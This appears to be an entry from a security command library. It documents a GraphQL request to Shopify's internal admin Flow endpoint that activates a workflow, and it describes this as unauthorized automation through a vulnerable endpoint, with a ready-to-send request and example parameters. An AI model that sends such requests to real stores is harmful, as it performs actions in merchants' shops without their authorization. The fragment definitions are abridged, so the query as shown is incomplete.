---
id: 123e4567-e89b-12d3-a456-426614174007
name: shopify-workflowactivate-mutation
type: command
executor: http
data: >-
  {"operationName":"activateWorkflowMutation","variables":{"workflowId":"240ed0ee-d099-4066-8eac-7ce777ef4fe4","version":"acc5731a-7802-4622-857b-0191f8c0ee9d","contextType":"shop","contextId":"10979704928"},"query":"mutation
  activateWorkflowMutation($workflowId: ID!, $version: String, $contextType:
  String!, $contextId: ID!) {\n workflowActivate(\n workflowId: $workflowId\n
  version: $version\n contextType: $contextType\n contextId: $contextId\n ) {\n
  workflow {\n ...workflow\n __typename\n }\n __typename\n }\n}\n\nfragment
  workflow on Workflow {\n id\n name\n steps {\n ...step\n __typename\n }\n
  links {\n ...link\n __typename\n }\n activations {\n ...activation\n
  __typename\n }\n lastUpdated\n activationState\n versionState\n version\n
  parentVersion\n shopifyDomain\n shopifyName\n owner {\n contextId\n
  contextType\n __typename\n }\n ...validationErrors\n tags\n __typename\n
  }\n\n[full fragment definitions for step, task, stepConfig, link, activation,
  validationErrors follow as provided in the content]"}
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:36.786Z'
platforms:
  - Web
tags:
  - graphql
  - shopify
  - mutation
verified: false
validated: true
submitted: true
---

# shopify-workflowactivate-mutation

## Command

Send as JSON body in POST request to /admin/internal/web/graphql/flow.

```http
POST /admin/internal/web/graphql/flow HTTP/2
Host: example.myshopify.com
Content-Type: application/json
Cookie: _secure_admin_session_id=abc
X-Csrf-Token: token

{"operationName":"activateWorkflowMutation","variables":{"workflowId":"240ed0ee-d099-4066-8eac-7ce777ef4fe4","version":"acc5731a-7802-4622-857b-0191f8c0ee9d","contextType":"shop","contextId":"10979704928"},"query":"mutation activateWorkflowMutation($workflowId: ID!, $version: String, $contextType: String!, $contextId: ID!) {\n workflowActivate(\n workflowId: $workflowId\n version: $version\n contextType: $contextType\n contextId: $contextId\n ) {\n workflow {\n ...workflow\n __typename\n }\n __typename\n }\n}\n\nfragment workflow on Workflow {\n id\n name\n steps {\n ...step\n __typename\n }\n links {\n ...link\n __typename\n }\n activations {\n ...activation\n __typename\n }\n lastUpdated\n activationState\n versionState\n version\n parentVersion\n shopifyDomain\n shopifyName\n owner {\n contextId\n contextType\n __typename\n }\n ...validationErrors\n tags\n __typename\n }\n\n[full fragment definitions]"}
```

## Description

GraphQL mutation to activate an installed workflow, demonstrating unauthorized automation like adding tags to new customer accounts via the vulnerable endpoint.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| workflowId | ID of the workflow to activate (e.g., '240ed0ee-d099-4066-8eac-7ce777ef4fe4') | Yes |
| version | Version string of the workflow (e.g., 'acc5731a-7802-4622-857b-0191f8c0ee9d') | No |
| contextType | Type of context (e.g., 'shop') | Yes |
| contextId | ID of the context (e.g., '10979704928') | Yes |

## Examples

### Basic Usage

```http
# As above for shop context
```

### Advanced Usage

```http
# With specific version
{"operationName":"activateWorkflowMutation","variables":{"workflowId":"gid://shopify/FlowWorkflow/123","version":"v1","contextType":"shop","contextId":"456"},"query":"..."}
```

## Expected Output

Response with activated workflow details including id, name, steps, activationState, or validation errors.

Example: {"data":{"workflowActivate":{"workflow":{"id":"gid://shopify/FlowWorkflow/240ed0ee-d099-4066-8eac-7ce777ef4fe4","activationState":"ACTIVE"}}}}

## Related

- [[commands/shopify-templateinstall-mutation]]
- [[procedures/Activate-Workflow-via-workflowActivate]]
